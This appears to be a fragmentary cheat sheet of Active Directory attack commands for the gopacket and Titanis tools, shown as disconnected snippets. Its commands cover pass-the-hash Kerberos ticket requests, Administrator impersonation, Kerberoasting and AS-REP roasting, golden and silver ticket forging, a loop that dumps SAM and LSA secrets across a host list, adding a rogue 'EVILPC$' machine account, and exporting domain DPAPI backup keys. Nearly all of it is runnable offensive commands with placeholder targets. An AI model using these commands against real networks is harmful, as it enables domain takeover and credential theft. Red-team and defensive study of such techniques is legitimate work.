...
wmiexec DOMAIN/jdoe:Password123@192.168.1.10
...
# gopacket — password
getTGT -dc-ip 192.168.1.1 DOMAIN/jdoe:Password123@192.168.1.1
...
# gopacket — NTLM hash
getTGT -dc-ip 192.168.1.1 -hashes :A2F8C3D1B4E5F6A7B8C9D0E1F2A3B4C5 DOMAIN/jdoe@192.168.1.1
...
# gopacket — password
getST -dc-ip 192.168.1.1 -spn cifs/fileserver.domain.local DOMAIN/jdoe:Password123@192.168.1.1
# gopacket — pass-the-hash
getST -dc-ip 192.168.1.1 -spn cifs/fileserver.domain.local \
  -hashes :A2F8C3D1B4E5F6A7B8C9D0E1F2A3B4C5 DOMAIN/jdoe@192.168.1.1
```
...
getST -dc-ip 192.168.1.1 -spn cifs/target.domain.local -impersonate Administrator \
  DOMAIN/svc:Password123@192.168.1.1
# gopacket — pass-the-hash
getST -dc-ip 192.168.1.1 -spn cifs/target.domain.local -impersonate Administrator \
  -hashes :A2F8C3D1B4E5F6A7B8C9D0E1F2A3B4C5 DOMAIN/svc@192.168.1.1
```
...
GetUserSPNs -dc-ip 192.168.1.1 -port 389 -request DOMAIN/jdoe:Password123@192.168.1.1
# gopacket — pass-the-hash
...
GetNPUsers -dc-ip 192.168.1.1 -port 389 DOMAIN/jdoe:Password123@192.168.1.1
# gopacket — pass-the-hash
...
ticketer -nthash <krbtgt_ntlm> -domain-sid S-1-5-21-... \
  -domain DOMAIN.LOCAL Administrator
export KRB5CCNAME=Administrator.ccache
wmiexec -k -no-pass DOMAIN/Administrator@dc01.domain.local "whoami"
# gopacket — silver ticket (service account NT hash)
ticketer -nthash <service_ntlm> -domain-sid S-1-5-21-... \
  -domain DOMAIN.LOCAL -spn cifs/fileserver.domain.local Administrator
export KRB5CCNAME=Administrator.ccache
smbclient -k -no-pass DOMAIN/Administrator@fileserver.domain.local
```
...
while IFS= read -r host; do
  ...
  reg dumpsam        "$host" -UserName jdoe -UserDomain DOMAIN -Password Password123 -BackupSemantics >> sam_dump.txt 2>&1
  reg dumplsasecrets "$host" -UserName jdoe -UserDomain DOMAIN -Password Password123 -BackupSemantics >> lsa_dump.txt 2>&1
done < hosts.txt
```
...
# Titanis — start / stop
Scm start 192.168.1.10 -UserName jdoe -UserDomain DOMAIN -Password Password123 Spooler
Scm stop  192.168.1.10 -UserName jdoe -UserDomain DOMAIN -Password Password123 Spooler
...
# Titanis
Lsa enumaccounts     192.168.1.10 -UserName jdoe -UserDomain DOMAIN -Password Password123  # requires admin
Lsa enumprivaccounts 192.168.1.10 -UserName jdoe -UserDomain DOMAIN -Password Password123 -Privilege SeDebugPrivilege
Lsa getprivs         192.168.1.10 -UserName jdoe -UserDomain DOMAIN -Password Password123 -ByName jdoe
Lsa getrights        192.168.1.10 -UserName jdoe -UserDomain DOMAIN -Password Password123 -ByName jdoe
Lsa getsysaccess     192.168.1.10 -UserName jdoe -UserDomain DOMAIN -Password Password123 -ByName jdoe
```
...
GetADUsers -all -dc-ip 192.168.1.1 -port 389 DOMAIN/jdoe:Password123@192.168.1.1
# gopacket — enumerate AD computers (requires -port 389)
GetADComputers -dc-ip 192.168.1.1 -port 389 DOMAIN/jdoe:Password123@192.168.1.1
# gopacket — pass-the-hash
...
findDelegation -dc-ip 192.168.1.1 -port 389 DOMAIN/jdoe:Password123@192.168.1.1
# gopacket — pass-the-hash
...
addcomputer -method SAMR -computer-name EVILPC$ -computer-pass Password123 \
  -dc-ip 192.168.1.1 DOMAIN/jdoe:Password123@192.168.1.1
...
addcomputer -method LDAP -computer-name EVILPC$ -computer-pass Password123 \
  -dc-ip 192.168.1.1 -port 389 DOMAIN/jdoe:Password123@192.168.1.1
```
...
dacledit -action read -target-dn "CN=targetuser,CN=Users,DC=domain,DC=local" \
  -dc-ip 192.168.1.1 -port 389 DOMAIN/admin:AdminPass@192.168.1.1
...
dpapi backupkeys 'DOMAIN/Administrator:Password123@192.168.1.1' --export
# gopacket — pass-the-hash
dpapi backupkeys 'DOMAIN/Administrator@192.168.1.1' --export \
  -hashes :A2F8C3D1B4E5F6A7B8C9D0E1F2A3B4C5
